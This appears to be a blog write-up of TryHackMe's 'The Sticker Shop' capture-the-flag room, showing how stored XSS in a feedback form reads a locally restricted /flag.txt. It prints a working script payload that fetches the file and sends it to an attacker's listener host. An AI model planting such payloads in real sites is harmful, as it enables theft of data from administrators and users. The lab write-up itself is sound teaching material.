> Can you exploit the sticker shop in order to capture the flag?

Room Link: [https://tryhackme.com/room/thestickershop](https://tryhackme.com/room/thestickershop)

This challenge from TryHackMe — _The Sticker Shop_ — takes us through a fun yet realistic scenario that highlights the **real-world impact of client-side vulnerabilities**, specifically **stored XSS (Cross-Site Scripting)**.

You’re placed in the shoes of an attacker targeting a small sticker business that just launched their own website. Due to limited technical experience, they made a critical mistake: **they use the same machine for both hosting the website and browsing customer feedback**.

This opens the door for **client-side exploitation** — where a cleverly crafted payload can execute in the browser of someone reviewing the input, possibly revealing sensitive internal data.

The mission?  
➡️ **Find a way to read the contents of** `**/flag.txt**` **— a file that is restricted to local access.**

With a little bit of creativity and JavaScript, we’ll turn their poor architecture decision into an attack vector.

Let’s dive in.

# 🧠 Scenario

![](https://miro.medium.com/v2/resize:fit:875/1*NLpZW3ZCP1z8CdjyjFRSSg.png)

# Question

![](https://miro.medium.com/v2/resize:fit:280/1*WVolCvAZ-x6iZt2Eofw2Dg.png)

# 🌐 Website Exploration

After identifying the target IP address and confirming that the web service runs on port `8080`, I navigated to the site and found a simple webpage for a **Cat Sticker Shop**.

![](https://miro.medium.com/v2/resize:fit:875/1*XEDOJP0vpspdv4wbEJwOFw.png)

Exploring the site further, I discovered a **feedback section**, which contained a basic input form and a submit button — a potential entry point for client-side interactions.

![](https://miro.medium.com/v2/resize:fit:875/1*W7Gq8eZ46DXoiU3NTPLGfA.png)

Curious about the goal — which was to access the contents of `/flag.txt` — I attempted to visit `http://<target-ip>:8080/flag.txt` directly. However, it responded with:

![](https://miro.medium.com/v2/resize:fit:875/1*NOCWa980RKU2YexcwgUBsA.png)

This indicated that the file isn’t publicly accessible. It’s likely restricted to **local users only**, such as the browser used by the admin/server itself.

# 💥 Exploitation — Stored XSS via Feedback

After discovering the feedback form, my first thought was to test it for **stored XSS** and that the flag is inaccessible directly.

Since the feedback is likely reviewed by the shop owner (who’s using the same computer to browse the web and host the server), a successful XSS payload could allow me to execute JavaScript in their browser — **from the server’s perspective**, which **has access to** `**/flag.txt**`.

To achieve this, I crafted a basic XSS payload using `fetch()` to read the file and exfiltrate its content to my own machine:

<script>  
fetch('/flag.txt')  
  .then(r => r.text())  
  .then(data => fetch('http://<YOUR-IP>:<YOUR-PORT>/?flag=' + encodeURIComponent(data)));  
</script>

🔎 **Explanation:**

- `fetch('/flag.txt')` – Attempts to read the restricted flag file.
- The `.then()` block captures the response and encodes it.
- It then sends the flag as a GET request to my listener (`http://<YOUR-IP>:8000`), where I’m running a netcat listener:

![](https://miro.medium.com/v2/resize:fit:358/1*wJ-PJ8OR7vw98RWFj9Y7tQ.png)

I submitted this payload through the feedback form, and waited for the admin to view it.

![](https://miro.medium.com/v2/resize:fit:819/1*bAQE9Sr3Mtp_QFBuoxwAkA.png)

After submitting the XSS payload and waiting a few moments, my listener received an incoming request from the server:

![](https://miro.medium.com/v2/resize:fit:875/1*8nWhOuiVm9_RLDLGBgO61Q.png)

Boom — there’s the flag!

# ✅ Conclusion

This challenge demonstrates a classic **stored XSS → client-side privilege abuse** scenario. Even though `/flag.txt` was protected from public access, exploiting the trust between the admin's browser and the local server allowed us to bypass the restriction.

🔐 **Lesson learned**: Always sanitize user input — and never browse untrusted input directly from your production server.